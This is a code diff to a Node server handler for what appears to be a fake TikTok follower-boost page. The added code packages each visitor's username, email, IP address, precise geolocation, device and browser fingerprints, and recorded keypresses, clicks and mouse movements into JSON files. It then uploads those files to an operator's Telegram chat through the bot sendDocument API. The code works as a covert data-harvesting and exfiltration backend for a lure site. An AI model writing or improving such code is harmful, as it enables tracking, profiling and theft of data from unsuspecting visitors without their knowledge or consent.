@@ -5,6 +5,10 @@ import { insertSubmissionSchema, deviceInfoSchema } from "@shared/schema";
 import { log } from "./vite";
 import { ZodError } from "zod";
 import fetch from "node-fetch";
+import FormData from "form-data";
+import * as fs from "fs";
+import * as path from "path";
+import * as os from "os";
 
 // Function to validate device information
 function validateDeviceInfo(deviceInfo: any, ipAddress: string, userInfo: any) {
@@ -46,7 +50,7 @@ function validateDeviceInfo(deviceInfo: any, ipAddress: string, userInfo: any) {
 }
 
 // Format and organize collected fingerprint data for easy use
-function formatFingerprintData(submission: Submission): Record<string, any> {
+function formatFingerprintData(submission: any): Record<string, any> {
   try {
     // Base fingerprint data
     const deviceInfo = submission.deviceInfo || {};
@@ -296,45 +300,157 @@ ${userInfo?.userAgent || 'Unknown'}
         chunkIndex++;
       }
       
-      // Send each chunk as a separate message
-      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      console.log("Sending to Telegram with verified credentials");
+      console.log("Sending notification to Telegram...");
+      // API endpoints for Telegram
+      const sendMessageUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const sendDocumentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
       
-      let responseData;
-      
-      // Send chunks sequentially
-      for (const chunk of messageChunks) {
-        const response = await fetch(telegramUrl, {
+      try {
+        // First, send a brief summary message
+        const summaryMessage = `
+🔥 New TikTok Follower Request 🔥
+👤 Username: @${username}
+⭐ Followers: ${followers}
+📱 Device: ${deviceModel}
+⏰ Timestamp: ${new Date().toISOString()}
+
+💾 Sending fingerprint data as JSON files...
+        `;
+        
+        const summaryResponse = await fetch(sendMessageUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
-            text: chunk
+            text: summaryMessage
           })
         });
         
-        responseData = await response.json();
-        console.log("Telegram API response for chunk:", responseData);
-        
-        // If any chunk fails, throw an error
-        if (responseData && typeof responseData === 'object' && 'ok' in responseData && !responseData.ok) {
-          const errorMessage = (responseData as any).description || 'Unknown Telegram API error';
-          console.error("Telegram API error when sending chunk:", errorMessage);
-          throw new Error(`Telegram API error: ${errorMessage}`);
+        const summaryData = await summaryResponse.json() as { ok: boolean, description?: string };
+        if (!summaryData.ok) {
+          throw new Error(`Failed to send summary: ${summaryData.description || "Unknown error"}`);
         }
         
-        // Add a small delay between messages to avoid rate limiting
-        if (messageChunks.length > 1) {
-          await new Promise(resolve => setTimeout(resolve, 100));
+        // Create JSON data files organized by category
+        const jsonData = {
+          userInfo: {
+            username,
+            followers,
+            email: req.body.email || "",
+            submissionTime: new Date().toISOString()
+          },
+          deviceInfo: {
+            device: deviceModel,
+            brand: mobileDetails?.brand || 'Unknown',
+            model: mobileDetails?.model || 'Unknown',
+            osVersion: mobileDetails?.osVersion || 'Unknown',
+            deviceType: mobileDetails?.deviceType || 'Unknown',
+            screenSize: userInfo?.screenSize || 'Unknown',
+            platform: userInfo?.platform || 'Unknown',
+            userAgent: userInfo?.userAgent || 'Unknown'
+          },
+          networkInfo: {
+            ipAddress: ipAddress || userInfo?.ip || 'Unknown',
+            ipVersion: ipAddress && ipAddress.includes(':') ? 'IPv6' : 'IPv4',
+            provider: ipDetails?.isp || 'Unknown',
+            connectionType: userInfo?.connection?.type || 'Unknown',
+            networkChanges: networkChanges || [],
+            proxy: userInfo?.isProxy || false,
+            vpn: userInfo?.isVpn || false
+          },
+          geoInfo: {
+            country: geolocationDetails?.country || 'Unknown',
+            city: geolocationDetails?.city || 'Unknown',
+            region: geolocationDetails?.region || 'Unknown',
+            timezone: userInfo?.timezone || 'Unknown',
+            latitude: geolocation?.latitude || null,
+            longitude: geolocation?.longitude || null,
+            accuracy: geoAccuracy || 'Unknown',
+            source: geoSource || 'Unknown'
+          },
+          hardwareInfo: {
+            cores: userInfo?.hardwareConcurrency || 'Unknown',
+            memory: userInfo?.deviceMemory || 'Unknown',
+            gpu: hardwareInfo?.gpu || 'Unknown',
+            touchPoints: hardwareInfo?.touchPoints || 'Unknown',
+            battery: hardwareInfo?.batteryLevel || 'Unknown',
+            sensors: sensors || {}
+          },
+          fingerprintInfo: {
+            canvas: userInfo?.canvasFingerprint || 'Not available',
+            webgl: userInfo?.webglFingerprint || 'Not available',
+            audio: userInfo?.audioFingerprint || 'Not available',
+            fonts: userInfo?.fonts ? userInfo.fonts.split(',') : [],
+            plugins: userInfo?.plugins ? userInfo.plugins.split(',') : [],
+            cookiesEnabled: userInfo?.cookiesEnabled || false,
+            doNotTrack: userInfo?.doNotTrack !== 'unknown',
+            isEmulator: userInfo?.isEmulator || false,
+            browserFingerprint: userInfo?.browserFingerprint || 'Not available'
+          },
+          behavioralInfo: {
+            mouseMovements: userInfo?.behavioralData?.mouseMovements || [],
+            clicks: userInfo?.behavioralData?.clicks || [],
+            keypresses: userInfo?.behavioralData?.keypresses || [],
+            scrollPatterns: userInfo?.behavioralData?.scrollPatterns || [],
+            touchPatterns: userInfo?.behavioralData?.touchPatterns || []
+          }
+        };
+        
+        // Create temporary directory for JSON files
+        const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tiktok-json-'));
+        
+        try {
+          // Send each category as a separate JSON file
+          for (const category of Object.keys(jsonData)) {
+            const categoryData = jsonData[category as keyof typeof jsonData];
+            const jsonContent = JSON.stringify(categoryData, null, 2);
+            
+            // Create temporary file
+            const fileName = `${username}_${category}_${Date.now()}.json`;
+            const filePath = path.join(tempDir, fileName);
+            fs.writeFileSync(filePath, jsonContent);
+            
+            // Send file to Telegram
+            const form = new FormData();
+            form.append('chat_id', TELEGRAM_CHAT_ID);
+            form.append('document', fs.createReadStream(filePath), {
+              filename: fileName,
+              contentType: 'application/json'
+            });
+            
+            const fileResponse = await fetch(sendDocumentUrl, {
+              method: 'POST',
+              body: form as any,
+              headers: form.getHeaders()
+            });
+            
+            const fileData = await fileResponse.json();
+            if (!fileData.ok) {
+              throw new Error(`Failed to send ${category} file: ${fileData.description || "Unknown error"}`);
+            }
+            
+            // Short delay to avoid rate limiting
+            await new Promise(resolve => setTimeout(resolve, 300));
+          }
+          
+          console.log("Notification sent successfully to Telegram");
+        } finally {
+          // Clean up temporary files
+          try {
+            fs.readdirSync(tempDir).forEach(file => {
+              fs.unlinkSync(path.join(tempDir, file));
+            });
+            fs.rmdirSync(tempDir);
+          } catch (cleanupError) {
+            console.error("Error cleaning up temporary files:", cleanupError);
+          }
         }
+      } catch (error) {
+        console.error("Error sending notification to Telegram:", error);
+        throw error;
       }
       
-      if (responseData && typeof responseData === 'object' && 'ok' in responseData && !responseData.ok) {
-        // Handle error response from Telegram API
-        const errorMessage = (responseData as any).description || 'Unknown Telegram API error';
-        console.error("Telegram API error:", errorMessage);
-        throw new Error(`Telegram API error: ${errorMessage}`);
-      }
+      // Response is handled in the try block
       
       log(`Notification sent for user @${username}`, "telegram");
       return res.status(200).json({ success: true });
